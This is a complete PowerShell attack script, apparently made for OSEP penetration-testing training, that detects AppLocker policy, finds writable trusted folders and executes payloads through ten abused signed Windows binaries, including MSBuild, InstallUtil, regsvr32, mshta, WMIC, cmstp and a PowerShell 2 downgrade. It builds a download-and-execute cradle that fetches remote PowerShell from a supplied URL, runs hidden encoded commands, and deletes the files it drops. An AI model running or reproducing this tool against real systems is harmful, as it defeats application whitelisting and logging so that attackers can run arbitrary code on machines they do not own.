# OSEP - AppLocker Bypass
# Detects policy, enumerates writable trusted paths, tests LOLBAS availability,
# then attempts bypasses in order of reliability.
#
# Usage:
#   .\applocker_bypass.ps1                      # enum + report only
#   .\applocker_bypass.ps1 -Cmd "whoami"        # exec command via first working bypass
#   .\applocker_bypass.ps1 -PsUrl http://...    # load PS payload after bypass
#   .\applocker_bypass.ps1 -Technique msbuild   # force a specific technique
#   .\applocker_bypass.ps1 -ListTechniques      # show all technique names
#
# Techniques: msbuild, installutil, regsvr32, mshta, rundll32, ps2, wmic, pcalua, cmstp

param(
    [string]$Cmd           = "",
    [string]$PsUrl         = "",
    [string]$Technique     = "auto",
    [switch]$ListTechniques
)

$LogFile = "C:\Windows\Temp\osep_log.txt"
function Log($m) {
    $line = "$(Get-Date -Format 'HH:mm:ss') [AL] $m"
    $line | Tee-Object -FilePath $LogFile -Append | Write-Host
}

if ($ListTechniques) {
    @("msbuild","installutil","regsvr32","mshta","rundll32","ps2","wmic","pcalua","cmstp") | ForEach-Object { Write-Host $_ }
    exit 0
}

# ---------------------------------------------------------
# 1. AppLocker policy detection
# ---------------------------------------------------------
function Get-AppLockerStatus {
    $status = [ordered]@{
        LanguageMode    = $ExecutionContext.SessionState.LanguageMode.ToString()
        PolicyPresent   = $false
        EnforcedRules   = @()
        AuditOnlyRules  = @()
    }

    # Check registry for SRP/AppLocker rules
    $srpPath = "HKLM:\Software\Policies\Microsoft\Windows\SrpV2"
    if (Test-Path $srpPath) {
        $status.PolicyPresent = $true
        Get-ChildItem $srpPath -ErrorAction SilentlyContinue | ForEach-Object {
            $collection = $_.PSChildName
            $_.GetSubKeyNames() | ForEach-Object {
                try {
                    $rule = Get-ItemProperty "$srpPath\$collection\$_" -ErrorAction SilentlyContinue
                    if ($rule.EnforcementMode -eq 1) { $status.EnforcedRules  += $collection }
                    elseif ($rule.EnforcementMode -eq 0) { $status.AuditOnlyRules += $collection }
                } catch {}
            }
        }
        $status.EnforcedRules  = $status.EnforcedRules  | Sort-Object -Unique
        $status.AuditOnlyRules = $status.AuditOnlyRules | Sort-Object -Unique
    }

    # Try AppLocker WMI (requires AppIDSvc running)
    try {
        $policy = Get-AppLockerPolicy -Effective -ErrorAction Stop
        $status.PolicyPresent = $true
        $policy.RuleCollections | ForEach-Object {
            $col  = $_.RuleCollectionType
            $mode = $_.EnforcementMode
            if ($mode -eq "Enabled")   { $status.EnforcedRules  += $col }
            if ($mode -eq "AuditOnly") { $status.AuditOnlyRules += $col }
        }
        $status.EnforcedRules  = $status.EnforcedRules  | Sort-Object -Unique
        $status.AuditOnlyRules = $status.AuditOnlyRules | Sort-Object -Unique
    } catch {}

    return $status
}

# ---------------------------------------------------------
# 2. Writable trusted paths
# Known AppLocker default-allow directories that are writable
# ---------------------------------------------------------
$TrustedWritablePaths = @(
    "C:\Windows\Tasks",
    "C:\Windows\Temp",
    "C:\Windows\tracing",
    "C:\Windows\System32\Tasks",
    "C:\Windows\SysWOW64\Tasks",
    "C:\Windows\System32\com\dmp",
    "C:\Windows\SysWOW64\com\dmp",
    "C:\Windows\System32\FxsTmp",
    "C:\Windows\SysWOW64\FxsTmp",
    "C:\Windows\System32\spool\drivers\color",
    "C:\Windows\System32\spool\PRINTERS",
    "C:\Windows\System32\spool\PRTPROCS\x64",
    "C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys",
    "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup",
    "$env:TEMP"
)

function Get-WritablePaths {
    $writable = @()
    foreach ($p in $TrustedWritablePaths) {
        if (-not (Test-Path $p)) { continue }
        $test = "$p\__al_test_$([System.IO.Path]::GetRandomFileName())"
        try {
            [IO.File]::WriteAllText($test, "x")
            Remove-Item $test -Force -ErrorAction SilentlyContinue
            $writable += $p
        } catch {}
    }
    return $writable
}

# ---------------------------------------------------------
# 3. LOLBAS availability checks
# ---------------------------------------------------------
$LolbinPaths = [ordered]@{
    MSBuild       = @(
        "$env:windir\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe",
        "$env:windir\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe"
    )
    InstallUtil   = @(
        "$env:windir\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe",
        "$env:windir\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe"
    )
    Regsvr32      = @("$env:windir\System32\regsvr32.exe")
    Mshta         = @("$env:windir\System32\mshta.exe")
    Rundll32      = @("$env:windir\System32\rundll32.exe")
    Powershell2   = @("$env:windir\System32\WindowsPowerShell\v1.0\powershell.exe")
    Wmic          = @("$env:windir\System32\wbem\wmic.exe")
    Pcalua        = @("$env:windir\System32\pcalua.exe")
    Cmstp         = @("$env:windir\System32\cmstp.exe")
    Odbcconf      = @("$env:windir\System32\odbcconf.exe")
    Bash          = @("$env:windir\System32\bash.exe","$env:windir\SysWOW64\bash.exe")
    PresentationHost = @("$env:windir\System32\PresentationHost.exe")
}

function Get-AvailableLolbins {
    $found = [ordered]@{}
    foreach ($name in $LolbinPaths.Keys) {
        foreach ($path in $LolbinPaths[$name]) {
            if (Test-Path $path) {
                $found[$name] = $path
                break
            }
        }
    }
    return $found
}

# ---------------------------------------------------------
# Payload builder helpers
# ---------------------------------------------------------
function Get-PSPayload {
    # Returns a PS command string that either runs $Cmd or downloads $PsUrl
    if ($PsUrl -ne "") {
        return "IEX (New-Object Net.WebClient).DownloadString('$PsUrl')"
    } elseif ($Cmd -ne "") {
        return $Cmd
    } else {
        return "Write-Host '[+] AppLocker bypass working'"
    }
}

function Get-TempPath([string]$ext) {
    $writable = Get-WritablePaths
    $base = if ($writable.Count -gt 0) { $writable[0] } else { $env:TEMP }
    return "$base\$([System.IO.Path]::GetRandomFileName()).$ext"
}

# ---------------------------------------------------------
# Bypass: MSBuild inline task
# Reliable; MSBuild is Microsoft-signed and usually allowed.
# Builds an inline C# task that runs arbitrary code via IEX.
# ---------------------------------------------------------
function Invoke-MsbuildBypass {
    $lolbin = $LolbinPaths.MSBuild | Where-Object { Test-Path $_ } | Select-Object -First 1
    if (-not $lolbin) { Log "[-] MSBuild not found"; return $false }

    $payload = Get-PSPayload
    $proj    = Get-TempPath "csproj"

    $xml = @"
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Go">
    <ClassTask />
  </Target>
  <UsingTask TaskName="ClassTask" TaskFactory="CodeTaskFactory"
    AssemblyFile="$(${env:windir})\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
    <Task>
      <Code Type="Class" Language="cs"><![CDATA[
        using System;
        using System.Diagnostics;
        using Microsoft.Build.Framework;
        using Microsoft.Build.Utilities;
        public class ClassTask : Task, ITask {
          public override bool Execute() {
            var psi = new ProcessStartInfo("powershell.exe") {
              Arguments = "-nop -w hidden -enc $([Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload)))",
              UseShellExecute = false,
              CreateNoWindow  = true
            };
            Process.Start(psi);
            return true;
          }
        }
      ]]></Code>
    </Task>
  </UsingTask>
</Project>
"@

    try {
        [IO.File]::WriteAllText($proj, $xml)
        Log "[*] MSBuild: wrote project to $proj"
        $p = Start-Process $lolbin -ArgumentList $proj -WindowStyle Hidden -PassThru
        Start-Sleep -Seconds 3
        Remove-Item $proj -Force -ErrorAction SilentlyContinue
        Log "[+] MSBuild: launched (PID $($p.Id))"
        return $true
    } catch {
        Log "[-] MSBuild error: $_"
        Remove-Item $proj -Force -ErrorAction SilentlyContinue
        return $false
    }
}

# ---------------------------------------------------------
# Bypass: InstallUtil uninstall method
# /U flag triggers [RunInstallerAttribute] Uninstall() without installing.
# DLL rules often absent; exe rules allow InstallUtil (MS-signed).
# ---------------------------------------------------------
function Invoke-InstallUtilBypass {
    $lolbin = $LolbinPaths.InstallUtil | Where-Object { Test-Path $_ } | Select-Object -First 1
    if (-not $lolbin) { Log "[-] InstallUtil not found"; return $false }

    $payload = Get-PSPayload
    $src     = Get-TempPath "cs"
    $dll     = [IO.Path]::ChangeExtension($src, "dll")
    $csc     = "$env:windir\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
    if (-not (Test-Path $csc)) { $csc = "$env:windir\Microsoft.NET\Framework\v4.0.30319\csc.exe" }
    if (-not (Test-Path $csc)) { Log "[-] InstallUtil: csc.exe not found"; return $false }

    $code = @"
using System;
using System.Configuration.Install;
using System.ComponentModel;
using System.Diagnostics;
[System.ComponentModel.RunInstaller(true)]
public class Go : System.Configuration.Install.Installer {
    public override void Uninstall(System.Collections.IDictionary s) {
        var psi = new ProcessStartInfo("powershell.exe") {
            Arguments = "-nop -w hidden -enc $([Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload)))",
            UseShellExecute = false, CreateNoWindow = true
        };
        Process.Start(psi);
    }
}
"@

    try {
        [IO.File]::WriteAllText($src, $code)
        $compile = Start-Process $csc -ArgumentList "/nologo /target:library /out:`"$dll`" `"$src`"" -Wait -WindowStyle Hidden -PassThru
        Remove-Item $src -Force -ErrorAction SilentlyContinue
        if (-not (Test-Path $dll)) { Log "[-] InstallUtil: compile failed"; return $false }
        Log "[*] InstallUtil: compiled to $dll"
        $p = Start-Process $lolbin -ArgumentList "/logfile= /LogToConsole=false /U `"$dll`"" -WindowStyle Hidden -PassThru
        Start-Sleep -Seconds 3
        Remove-Item $dll -Force -ErrorAction SilentlyContinue
        Log "[+] InstallUtil: launched (PID $($p.Id))"
        return $true
    } catch {
        Log "[-] InstallUtil error: $_"
        Remove-Item $src,$dll -Force -ErrorAction SilentlyContinue
        return $false
    }
}

# ---------------------------------------------------------
# Bypass: Regsvr32 / Squiblydoo
# Runs a COM scriptlet (SCT) via scrobj.dll - fetches remote or local.
# No AppLocker DLL rules needed; regsvr32 is MS-signed.
# Requires $PsUrl or embeds $Cmd in the SCT directly.
# ---------------------------------------------------------
function Invoke-Regsvr32Bypass {
    $lolbin = $LolbinPaths.Regsvr32 | Where-Object { Test-Path $_ } | Select-Object -First 1
    if (-not $lolbin) { Log "[-] Regsvr32 not found"; return $false }

    $payload = Get-PSPayload
    $sct     = Get-TempPath "sct"

    $xml = @"
<?XML version="1.0"?>
<scriptlet>
<registration progid="AL" classid="{AAAA0000-0000-0000-0000-000000000001}">
  <script language="JScript">
    <![CDATA[
      var shell = new ActiveXObject("WScript.Shell");
      shell.Run("powershell.exe -nop -w hidden -enc $([Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload)))",0,false);
    ]]>
  </script>
</registration>
</scriptlet>
"@

    try {
        [IO.File]::WriteAllText($sct, $xml)
        Log "[*] Regsvr32: wrote SCT to $sct"
        $p = Start-Process $lolbin -ArgumentList "/s /n /u /i:`"$sct`" scrobj.dll" -WindowStyle Hidden -PassThru
        Start-Sleep -Seconds 3
        Remove-Item $sct -Force -ErrorAction SilentlyContinue
        Log "[+] Regsvr32: launched (PID $($p.Id))"
        return $true
    } catch {
        Log "[-] Regsvr32 error: $_"
        Remove-Item $sct -Force -ErrorAction SilentlyContinue
        return $false
    }
}

# ---------------------------------------------------------
# Bypass: MSHTA inline VBScript
# mshta.exe is MS-signed and allowed by most policies.
# ---------------------------------------------------------
function Invoke-MshtaBypass {
    $lolbin = $LolbinPaths.Mshta | Where-Object { Test-Path $_ } | Select-Object -First 1
    if (-not $lolbin) { Log "[-] MSHTA not found"; return $false }

    $payload = Get-PSPayload
    $enc     = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload))

    try {
        $arg = "vbscript:Execute(`"CreateObject(`"`"WScript.Shell`"`").Run `"`"powershell -nop -w hidden -enc $enc`"`",0:close`")"
        $p   = Start-Process $lolbin -ArgumentList $arg -WindowStyle Hidden -PassThru
        Log "[+] MSHTA: launched (PID $($p.Id))"
        return $true
    } catch {
        Log "[-] MSHTA error: $_"
        return $false
    }
}

# ---------------------------------------------------------
# Bypass: PowerShell 2.0 downgrade
# PS 2.0 has no AMSI, no ScriptBlock logging, no CLM enforcement.
# Also bypasses AppLocker script rules if policy targets PS5 only.
# ---------------------------------------------------------
function Invoke-PS2Bypass {
    $lolbin = $LolbinPaths.Powershell2 | Where-Object { Test-Path $_ } | Select-Object -First 1
    if (-not $lolbin) { Log "[-] PowerShell not found"; return $false }

    # Verify PS2 is actually available (not just PS5 binary)
    $ver = & $lolbin -version 2 -nop -Command '$PSVersionTable.PSVersion.Major' 2>&1
    if ($ver -notmatch "^2") {
        Log "[-] PS2 not installed on this system (got: $ver)"
        return $false
    }

    $payload = Get-PSPayload
    $enc     = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload))

    try {
        $p = Start-Process $lolbin -ArgumentList "-version 2 -nop -w hidden -enc $enc" -WindowStyle Hidden -PassThru
        Log "[+] PS2: launched (PID $($p.Id))"
        return $true
    } catch {
        Log "[-] PS2 error: $_"
        return $false
    }
}

# ---------------------------------------------------------
# Bypass: Rundll32 DLL execution
# AppLocker DLL rules are rarely configured (noisy, breaks apps).
# Drop a DLL to a writable trusted path and execute via rundll32.
# NOTE: requires a compiled DLL export - provides a template here.
# ---------------------------------------------------------
function Invoke-Rundll32Bypass {
    $lolbin = $LolbinPaths.Rundll32 | Where-Object { Test-Path $_ } | Select-Object -First 1
    if (-not $lolbin) { Log "[-] Rundll32 not found"; return $false }

    Log "[*] Rundll32: DLL rules are rarely enforced - drop a DLL with an exported function"
    Log "[*] Rundll32 template: rundll32.exe <path_to_dll>,<ExportedFunction>"
    Log "[*] Use av_evasion.py to generate an evasive DLL, then:"
    Log "[*]   rundll32.exe C:\Windows\Tasks\payload.dll,EntryPoint"

    # If a DLL path was provided via Cmd, try to run it
    if ($Cmd -match "\.dll") {
        $parts = $Cmd -split ","
        if ($parts.Count -eq 2) {
            try {
                $p = Start-Process $lolbin -ArgumentList $Cmd -WindowStyle Hidden -PassThru
                Log "[+] Rundll32: launched (PID $($p.Id))"
                return $true
            } catch {
                Log "[-] Rundll32 exec error: $_"
                return $false
            }
        }
    }
    return $false
}

# ---------------------------------------------------------
# Bypass: WMIC XSL transform
# wmic process get brief /format:<url>.xsl
# XSL can contain JScript that spawns processes.
# ---------------------------------------------------------
function Invoke-WmicBypass {
    $lolbin = $LolbinPaths.Wmic | Where-Object { Test-Path $_ } | Select-Object -First 1
    if (-not $lolbin) { Log "[-] WMIC not found"; return $false }

    $payload = Get-PSPayload
    $xsl     = Get-TempPath "xsl"

    $xml = @"
<?xml version='1.0'?>
<stylesheet xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
  xmlns:user="placeholder" version="1.0">
  <output method="text"/>
  <ms:script implements-prefix="user" language="JScript">
    <![CDATA[
      var shell = new ActiveXObject("WScript.Shell");
      shell.Run("powershell.exe -nop -w hidden -enc $([Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload)))",0,false);
    ]]>
  </ms:script>
  <template match="/">
    <value-of select="user:run()"/>
  </template>
</stylesheet>
"@

    try {
        [IO.File]::WriteAllText($xsl, $xml)
        Log "[*] WMIC: wrote XSL to $xsl"
        $p = Start-Process $lolbin -ArgumentList "process get brief /format:`"$xsl`"" -WindowStyle Hidden -PassThru
        Start-Sleep -Seconds 3
        Remove-Item $xsl -Force -ErrorAction SilentlyContinue
        Log "[+] WMIC: launched (PID $($p.Id))"
        return $true
    } catch {
        Log "[-] WMIC error: $_"
        Remove-Item $xsl -Force -ErrorAction SilentlyContinue
        return $false
    }
}

# ---------------------------------------------------------
# Bypass: Pcalua.exe
# Program Compatibility Assistant launcher - runs arbitrary exe.
# MS-signed, often absent from AppLocker deny lists.
# ---------------------------------------------------------
function Invoke-PcaluaBypass {
    $lolbin = $LolbinPaths.Pcalua | Where-Object { Test-Path $_ } | Select-Object -First 1
    if (-not $lolbin) { Log "[-] Pcalua not found"; return $false }

    $payload = Get-PSPayload
    $enc     = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload))
    $ps      = "$env:windir\System32\WindowsPowerShell\v1.0\powershell.exe"

    try {
        $p = Start-Process $lolbin -ArgumentList "-a `"$ps`" -c `-nop -w hidden -enc $enc" -WindowStyle Hidden -PassThru
        Log "[+] Pcalua: launched (PID $($p.Id))"
        return $true
    } catch {
        Log "[-] Pcalua error: $_"
        return $false
    }
}

# ---------------------------------------------------------
# Bypass: Cmstp.exe (COM Scriptlet via INF)
# Launches a COM scriptlet from a local INF file.
# ---------------------------------------------------------
function Invoke-CmstpBypass {
    $lolbin = $LolbinPaths.Cmstp | Where-Object { Test-Path $_ } | Select-Object -First 1
    if (-not $lolbin) { Log "[-] Cmstp not found"; return $false }

    $payload = Get-PSPayload
    $sct     = Get-TempPath "sct"
    $inf     = Get-TempPath "inf"

    $sctXml = @"
<?XML version="1.0"?>
<scriptlet><registration progid="CM" classid="{AAAA1111-1111-1111-1111-111111111111}">
  <script language="JScript"><![CDATA[
    var shell = new ActiveXObject("WScript.Shell");
    shell.Run("powershell.exe -nop -w hidden -enc $([Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload)))",0,false);
  ]]></script>
</registration></scriptlet>
"@

    $infContent = @"
[version]
Signature=`$chicago`$
AdvancedINF=2.5

[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RegisterOCXs=RegisterOCXSection

[RegisterOCXSection]
$sct

[CustInstDestSectionAllUsers]
49000,49001=AllUSer_LDIDSection,7

[AllUSer_LDIDSection]
"HKLM","SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE","ProfileInstallPath",0x2,"%%PROFILE%%"

[Strings]
ServiceName="AL"
ShortSvcName="AL"
"@

    try {
        [IO.File]::WriteAllText($sct, $sctXml)
        [IO.File]::WriteAllText($inf, $infContent)
        Log "[*] Cmstp: wrote INF to $inf"
        $p = Start-Process $lolbin -ArgumentList "/s /ns `"$inf`"" -WindowStyle Hidden -PassThru
        Start-Sleep -Seconds 4
        Remove-Item $sct,$inf -Force -ErrorAction SilentlyContinue
        Log "[+] Cmstp: launched (PID $($p.Id))"
        return $true
    } catch {
        Log "[-] Cmstp error: $_"
        Remove-Item $sct,$inf -Force -ErrorAction SilentlyContinue
        return $false
    }
}

# ---------------------------------------------------------
# ---------------------------------------------------------
# Bypass: Unmanaged PowerShell runspace via MSBuild InlineTask
# Does NOT launch powershell.exe at all.
# PS code runs inside msbuild.exe via System.Management.Automation.dll.
# Bypasses: AppLocker Exe rules targeting powershell.exe,
#            Script rules (no .ps1 file on disk),
#            CLM (new runspace is FullLanguage unless policy is system-wide).
# ---------------------------------------------------------
function Invoke-UnmanagedPS {
    $lolbin = $LolbinPaths.MSBuild | Where-Object { Test-Path $_ } | Select-Object -First 1
    if (-not $lolbin) { Log "[-] UnmanagedPS: MSBuild not found"; return $false }

    $payload = Get-PSPayload
    $proj    = Get-TempPath "csproj"

    # Inline C# task that creates a runspace directly inside msbuild.exe
    # No powershell.exe spawned - SMA.dll is loaded into the MSBuild process
    $xml = @"
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Go"><RunPS /></Target>
  <UsingTask TaskName="RunPS" TaskFactory="CodeTaskFactory"
    AssemblyFile="$(${env:windir})\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
    <Task>
      <Reference Include="System.Management.Automation" />
      <Code Type="Class" Language="cs"><![CDATA[
        using System;
        using System.Management.Automation;
        using System.Management.Automation.Runspaces;
        using Microsoft.Build.Framework;
        using Microsoft.Build.Utilities;
        public class RunPS : Task, ITask {
          public override bool Execute() {
            try {
              var rs = RunspaceFactory.CreateRunspace();
              rs.Open();
              var ps = PowerShell.Create();
              ps.Runspace = rs;
              ps.AddScript(@"$payload");
              var results = ps.Invoke();
              foreach (var r in results) { Console.WriteLine(r.ToString()); }
              rs.Close();
            } catch (Exception ex) { Console.WriteLine("[-] " + ex.Message); }
            return true;
          }
        }
      ]]></Code>
    </Task>
  </UsingTask>
</Project>
"@

    try {
        [IO.File]::WriteAllText($proj, $xml)
        Log "[*] UnmanagedPS: wrote project to $proj"
        $p = Start-Process $lolbin -ArgumentList $proj -WindowStyle Hidden -Wait -PassThru
        Remove-Item $proj -Force -ErrorAction SilentlyContinue
        Log "[+] UnmanagedPS: MSBuild runspace exited (code $($p.ExitCode))"
        return $true
    } catch {
        Log "[-] UnmanagedPS error: $_"
        Remove-Item $proj -Force -ErrorAction SilentlyContinue
        return $false
    }
}

# Technique dispatch table
# ---------------------------------------------------------
$Bypasses = [ordered]@{
    unmanagedps = { Invoke-UnmanagedPS }
    msbuild     = { Invoke-MsbuildBypass }
    installutil = { Invoke-InstallUtilBypass }
    regsvr32    = { Invoke-Regsvr32Bypass }
    mshta       = { Invoke-MshtaBypass }
    ps2         = { Invoke-PS2Bypass }
    wmic        = { Invoke-WmicBypass }
    pcalua      = { Invoke-PcaluaBypass }
    cmstp       = { Invoke-CmstpBypass }
    rundll32    = { Invoke-Rundll32Bypass }
}

# ---------------------------------------------------------
# Main
# ---------------------------------------------------------
Log "=== AppLocker Bypass start ==="

# --- Policy detection ---
Log "--- Policy Detection ---"
$alStatus = Get-AppLockerStatus
Log "[*] Language mode  : $($alStatus.LanguageMode)"
Log "[*] Policy present : $($alStatus.PolicyPresent)"
if ($alStatus.EnforcedRules.Count -gt 0)  { Log "[!] Enforced rules : $($alStatus.EnforcedRules -join ', ')" }
if ($alStatus.AuditOnlyRules.Count -gt 0) { Log "[~] Audit-only rules: $($alStatus.AuditOnlyRules -join ', ')" }
if (-not $alStatus.PolicyPresent)          { Log "[+] No AppLocker policy detected - may not be needed" }

# --- Writable trusted paths ---
Log "--- Writable Trusted Paths ---"
$writablePaths = Get-WritablePaths
if ($writablePaths.Count -gt 0) {
    $writablePaths | ForEach-Object { Log "[+] Writable: $_" }
} else {
    Log "[-] No writable trusted paths found"
}

# --- LOLBAS availability ---
Log "--- LOLBAS Availability ---"
$lolbins = Get-AvailableLolbins
foreach ($name in $lolbins.Keys) { Log "[+] Found: $name -> $($lolbins[$name])" }
$missing = $LolbinPaths.Keys | Where-Object { -not $lolbins.Contains($_) }
$missing | ForEach-Object { Log "[-] Missing: $_" }

# --- Bypass execution ---
if ($Cmd -eq "" -and $PsUrl -eq "") {
    Log "[*] No payload specified - enum only mode"
    Log "=== Done ==="
    exit 0
}

Log "--- Executing Bypass ---"

if ($Technique -ne "auto") {
    if ($Bypasses.Contains($Technique)) {
        $result = & $Bypasses[$Technique]
        if (-not $result) { Log "[-] Technique '$Technique' failed" }
    } else {
        Log "[-] Unknown technique: $Technique"
    }
} else {
    $succeeded = $false
    foreach ($name in $Bypasses.Keys) {
        Log "[*] Trying: $name"
        if (& $Bypasses[$name]) {
            $succeeded = $true
            Log "[+] Success via: $name"
            break
        }
    }
    if (-not $succeeded) { Log "[-] All bypass techniques failed" }
}

Log "=== Done ==="
